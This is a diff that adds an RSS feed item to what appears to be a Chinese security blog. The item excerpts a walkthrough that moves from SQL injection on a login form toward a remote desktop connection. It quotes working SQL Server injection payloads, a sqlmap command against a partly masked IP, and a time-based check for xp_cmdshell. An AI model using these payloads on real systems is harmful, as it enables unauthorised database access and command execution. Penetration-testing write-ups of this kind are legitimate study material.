@@ -37,6 +37,21 @@ from gevent import monkey; monkey.patch_all() import requests import gevent def 
     </item>
     
     <item>
+      <title>从 SQL Server 注入到 远程连接桌面</title>
+      <link>http://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link>
+      <pubDate>Tue, 25 Jun 2019 17:01:53 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid>
+      <description>0x00 目标情况  只有一个登录框  0x01 发现注入 简单看了下登陆框，可以爆破用户名
+加单引号后报错，试了试 and 1=1 确实存在注入
+0x01 进一步测试 尝试得到数据版本: admin&#39; and @@version=1-- 抓包 sqlmap 跑了下发现不行: sqlmap -r 1.txt --risk 3 --level 3 --dbms &amp;quot;Microsoft SQL Server&amp;quot; --second-order &amp;quot;http://123.xxx.xxx.180:2001/error.aspx&amp;quot;
+返回: all tested parameters appear to be not injectable，跑不出来，只能手工了
+看下能不能多语句执行: admin&#39;;select convert(int,(select user));--
+结果发现可以执行成功，能进行多语句执行 0x02 尝试多语句执行添加用户  查看是否有 xp_cmdshell
+Payload：admin&#39;;if(1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)) WAITFOR DELAY &#39;0:0:5&#39;;--  开启 xp_cmdshell</description>
+    </item>
+    
+    <item>
       <title>从 SQL Server 注入到 getshell</title>
       <link>http://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
       <pubDate>Sat, 02 Mar 2019 20:23:35 +0800</pubDate>
